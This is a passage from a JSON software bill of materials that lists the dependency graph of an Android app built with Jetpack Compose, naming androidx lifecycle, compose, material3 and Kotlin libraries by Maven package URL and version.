\"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n                \"pkg:maven/androidx.arch.core/core-runtime@2.2.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material3/material3@1.2.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material3/material3-android@1.2.1?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-tooling-android@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-test-junit4-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n                \"pkg:maven/androidx.test.espresso/espresso-idling-resource@3.5.1?type=jar\",\n                \"pkg:maven/androidx.test.ext/junit@1.1.5?type=jar\",\n                \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/junit/junit@4.13.2?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.autofill/autofill@1.0.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/androidx.customview/customview-poolingcontainer@1.0.0?type=jar\",\n                \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-graphics-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material3/material3-android@1.2.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-preview-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.runtime/runtime-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.runtime/runtime-saveable-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.foundation/foundation-layout-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.material/material-icons-core-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data-android@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-test-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-geometry-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-text-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-unit-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection-ktx@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-util-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.foundation/foundation-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.foundation/foundation-layout-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material-icons-core-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                